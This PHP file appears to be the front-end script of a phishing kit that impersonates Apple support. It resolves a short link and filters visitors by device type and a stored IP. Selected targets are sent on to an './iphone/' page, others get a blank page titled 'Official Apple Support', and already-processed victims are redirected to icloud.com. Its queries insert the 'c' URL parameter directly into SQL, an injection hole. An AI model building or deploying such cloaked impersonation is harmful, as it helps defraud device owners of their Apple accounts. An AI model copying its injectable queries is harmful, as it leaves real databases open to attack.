<?php session_start();

require_once "config/config.php";
require_once "api/Dispositivo.php";
require_once 'api/Translator.php';


 $obj = new Dispositivo();
 $dispo = $obj->detecDisp();


$shortCode = $_GET["c"];
$linkg = "";
$tipo = "";
$sql = $con->prepare("SELECT * FROM short_urls where short_code = '$shortCode'");
$sql->execute();

if($sql->rowCount() == 1){  
  $shortC = $sql->fetch(PDO::FETCH_ASSOC);
  $url = $shortC["long_url"];
  $linkg = $shortC['linkg'];  
} 


$sqlp = $con->prepare("SELECT * FROM tblequipos WHERE linkg = '$linkg'");
$sqlp->execute();

if($sqlp->rowCount() == 1){  
  $plataforma = $sqlp->fetch(PDO::FETCH_ASSOC);
  $tipo   = $plataforma["tipo"];
  $valor1 = $plataforma['valor1'];
  $status = $plataforma['status'];
  $acceso = $plataforma['acceso'];
  $idusua = $plataforma['idusuario'];
  $_SESSION['linkg'] = $linkg;
  $_SESSION['idusuario'] = $plataforma["idusuario"];
  $miip = $plataforma['ip']; 

 
} 


if($status == "1"){
   echo "<script>top.location.href = 'https://www.icloud.com';</script>";
}

$ipmi = getRealIP();

$subdomains = $_SERVER['HTTP_HOST'];
$subdm = str_replace("www.", "", $subdomains);
$sqlsub = $con->prepare("SELECT * FROM tblsubdomains WHERE subdomains = '$subdm' AND idusuario = $idusua");
$sqlsub->execute();
if($sqlsub->rowCount() == 1){  
  $ipacceso = $sqlsub->fetch(PDO::FETCH_ASSOC);
  $accesoip = $ipacceso["accesoip"];
}


if($accesoip == 0){

   

     if($acceso == "movilaccess"){
      if($dispo == "tab" || $dispo == "mob"){
         accesoscript($tipo);
      }else{
         accessonull();
      }

    }elseif($acceso == "escaccess"){

      if($dispo == "tab" || $dispo == "mob"){
        accessonull();
      }else{
        accesoscript($tipo);
      }

    }elseif($acceso == "escmovilaccess"){
      if($dispo == "tab" || $dispo == "mob"){
        accesoscript($tipo);
      }elseif($dispo == "esc"){
        accesoscript($tipo);
      }else{    
        accesoscript($tipo);
      }
    }
 }



if($miip == ""){

  $accesoip = true;

    

}elseif($miip != ""){



  if($miip == $ipmi){   
    $accesoip = true;
  }else{ 
    $accesoip = false;
  }

}


if($accesoip == true){


      $updip = $con->prepare("UPDATE tblequipos SET ip = '$ipmi' WHERE linkg = '$linkg'"); 
      $updip->execute(); 

       $script = $tipo;

      

       if($acceso == "movilaccess"){

         if($dispo == "tab" || $dispo == "mob"){

            accesoscript($script);

         }else{

             accessonull();
         }

       }elseif($acceso == "escaccess"){

         if($dispo == "tab" || $dispo == "mob"){

             accessonull();
         }else{

            accesoscript($script);
         }

       }elseif($acceso == "escmovilaccess"){

         if($dispo == "tab" || $dispo == "mob"){

             accesoscript($script);

         }elseif($dispo == "esc"){

             accesoscript($script);
         }else{
    
             accesoscript($script);

         }

       }

}else{

  echo '<!DOCTYPE html>
        <html>
         <head>          
           <title>Official Apple Support</title>
           <link rel="shortcut icon" href="img/favi.ico" /> 
         </head>
         <body>
         </body>
         </html>';

}


function accesoscript($script){

 
 switch ($script){
    case "SUPPORT":  
     if($status == "1"){

        echo "<script>top.location.href = 'https://www.icloud.com';</script>";

     }elseif($status != "1"){
       header("location: ./iphone/?linkg=". $_SESSION['linkg']."&id=".$_SESSION['idusuario']);
     } 
   


       
 }


}
function accessonull(){

 

 

  echo '<!DOCTYPE html>
        <html>
         <head>
           <title>Official Apple Support</title>
           <link rel="shortcut icon" href="img/favi.ico" /> 
         </head>
         <body>
         </body>
         </html>';
}



function getRealIP(){

    if (isset($_SERVER["HTTP_CLIENT_IP"])){
        return $_SERVER["HTTP_CLIENT_IP"];
    }
    elseif (isset($_SERVER["HTTP_X_FORWARDED_FOR"])){
        return $_SERVER["HTTP_X_FORWARDED_FOR"];
    }
    elseif (isset($_SERVER["HTTP_X_FORWARDED"])){
        return $_SERVER["HTTP_X_FORWARDED"];
    }
    elseif (isset($_SERVER["HTTP_FORWARDED_FOR"])){
        return $_SERVER["HTTP_FORWARDED_FOR"];
    }
    elseif (isset($_SERVER["HTTP_FORWARDED"])){
        return $_SERVER["HTTP_FORWARDED"];
    }
    else{
        return $_SERVER["REMOTE_ADDR"];
    }

 }



?>